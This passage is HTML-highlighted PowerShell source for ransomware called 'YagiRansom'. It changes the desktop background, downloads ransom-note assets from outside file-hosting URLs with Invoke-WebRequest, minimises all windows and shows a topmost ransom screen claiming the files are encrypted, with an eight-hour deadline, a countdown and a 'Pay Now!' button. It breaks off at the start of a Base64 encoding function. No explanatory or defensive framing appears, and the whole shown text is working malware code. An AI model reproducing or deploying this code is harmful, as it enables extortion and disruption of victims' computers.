style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">SetSysColors(elements.Length, elements, colors);\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">RegistryKey key = Registry.CurrentUser.OpenSubKey(\"Control Panel\\\\Colors\", true);\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">key.SetValue(@\"Background\", string.Format(\"{0} {1} {2}\", color.R, color.G, color.B));\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">key.Close();}}}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">try { Add-Type -TypeDefinition \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$code\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -ReferencedAssemblies System.Drawing.dll }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function PopUpRansom {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\")  \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\") \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[void] [System.Windows.Forms.Application]::EnableVisualStyles() \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">Invoke-WebRequest -useb https://www.mediafire.com/view/wlq9mlfrlonlcuk/yagi.png/file -Outfile \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">env:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">temp\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\\YagiRansom.jpg\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">Invoke-WebRequest -useb https://www.mediafire.com/file/s4qcg4hk6bnd2pe/Yagi.ico/file -Outfile \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">env:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">temp\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\\YagiRansom.ico\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$shell\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object -ComObject \"Shell.Application\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$shell\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.minimizeall()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object system.Windows.Forms.Form\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ControlBox = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$false\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Size = New-Object System.Drawing.Size(900,600) \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.BackColor = \"Black\" \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.MaximizeBox = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$false\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.StartPosition = \"CenterScreen\" \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.WindowState = \"Normal\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Topmost = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$true\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.FormBorderStyle = \"Fixed3D\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Text = \"YagiRansom\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$formIcon\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object system.drawing.icon (\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">env:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">temp\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\\YagiRansom.ico\") \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Icon = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$formicon\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">  \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$img\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = [System.Drawing.Image]::Fromfile(\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">env:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">temp\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\\YagiRansom.jpg\")\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$pictureBox\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = new-object Windows.Forms.PictureBox\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$pictureBox\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Width = 920\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$pictureBox\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Height = 370\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$pictureBox\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.SizeMode = \"StretchImage\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$pictureBox\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Image = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$img\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.controls.add(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$pictureBox\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object System.Windows.Forms.Label\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ForeColor = \"Cyan\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Text = \"All your files have been encrypted by YagiRansom!\" \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.AutoSize = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$true\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Location = New-Object System.Drawing.Size(50,400) \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$font\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object System.Drawing.Font(\"Consolas\",15,[System.Drawing.FontStyle]::Bold) \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Font = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Font\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Controls.Add(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label1\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object System.Windows.Forms.Label\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label1\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ForeColor = \"White\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label1\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Text = \"But don\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">t worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.\" \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label1\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.AutoSize = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$true\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label1\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Location = New-Object System.Drawing.Size(50,450)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$font1\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object System.Drawing.Font(\"Consolas\",15,[System.Drawing.FontStyle]::Bold) \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Font = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Font1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Controls.Add(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$label1\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okbutton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = New-Object System.Windows.Forms.Button;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okButton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Location = New-Object System.Drawing.Point(750,500)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okButton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Size = New-Object System.Drawing.Size(110,35)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okbutton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ForeColor = \"Black\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okbutton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.BackColor = \"White\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okbutton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okButton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Text = 'Pay Now!'\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okbutton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Visible = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$false\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okbutton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Enabled = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$true\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okButton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.DialogResult = [System.Windows.Forms.DialogResult]::OK\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okButton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.add_Click({ \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[System.Windows.Forms.MessageBox]::Show(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$this\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ActiveForm, 'Your payment order has been successfully registered!', 'YagiRansom Payment Processing System',\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[Windows.Forms.MessageBoxButtons]::\"OK\", [Windows.Forms.MessageBoxIcon]::\"Warning\")})\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.AcceptButton = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okButton\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Controls.Add(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okButton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Activate() 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Focus() 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btn\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">=New-Object System.Windows.Forms.Label\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btn\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Location = New-Object System.Drawing.Point(50,500)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btn\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Width = 500\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Controls.Add(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btn\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btn\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ForeColor = \"Red\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$startTime\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = [DateTime]::Now\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$count\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = 10.6\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEqr\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">=New-Object System.Windows.Forms.Timer\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEqr\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.add_Tick({\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$elapsedSeconds\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = ([DateTime]::Now - \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$startTime\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">).TotalSeconds ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$remainingSeconds\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$count\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> - \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$elapsedSeconds\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">if (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$remainingSeconds\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -like \"-0.1*\"){ \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEqr\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Stop() ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$okbutton\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Visible = \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$true\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btn\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Text = \"0 Seconds remaining..\" }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btn\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Text = [String]::Format(\"{0} Seconds remaining..\", [math]::round(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$remainingSeconds\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">))})\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEqr\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Start()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btntest\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$form\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ShowDialog()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">if (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$btntest\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -like \"OK\"){ \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Global\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:PayNow\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \"True\" }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function R64Encoder { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   if (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[0] -eq \"-t\") { \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[1])) 